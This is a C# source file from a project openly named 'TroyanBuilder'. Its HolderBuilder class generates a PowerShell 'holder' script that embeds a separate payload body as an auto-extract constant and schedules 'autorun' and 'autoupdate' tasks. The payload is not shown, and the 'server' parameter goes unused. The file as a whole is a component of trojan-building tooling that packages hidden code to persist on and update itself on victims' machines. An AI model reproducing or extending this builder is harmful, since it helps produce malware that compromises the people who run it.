using System.Text.Json;
using System.Text.Json.Nodes;

namespace TroyanBuilder;

public class HolderBuilder: CustomBuilder
{
    protected override string SourceDir => Path.Combine(Model.TroyanScriptDir, "holder");
    protected override string OutputFile => Model.Holder;
    protected override string OutputReleaseFile => Model.HolderRelease;
    protected override string OutputDebugFile => Model.HolderDebug;

    protected override string[] PrioritySources => new [] {"consts_body", "consts_autoextract", "utils"};
    protected override string[] PriorityTasks => new [] { "autorun" };
    protected override string[] UnpriorityTasks => new [] {"autoupdate" };

    protected override void InternalBuild(string server)
    {
        MakeAutoExtract();
    }

    public void MakeAutoExtract()
    {
        var template = @"
$xbody = ""__BODY""
";
        var body = File.ReadAllText(Model.Body);
        template = template.Replace("__BODY", body);
        var outputPath = Path.Combine(Model.TroyanScriptDir, "holder", "consts_autoextract.ps1");
        File.WriteAllText(outputPath, template);
    }



    protected override List<string> GetSourceFiles()
    {
        var result = base.GetSourceFiles();
        result.Add("consts_body");
        result.Add("utils");
        result = result.SortWithPriority(PrioritySources).ToList();
        return result;
    }

}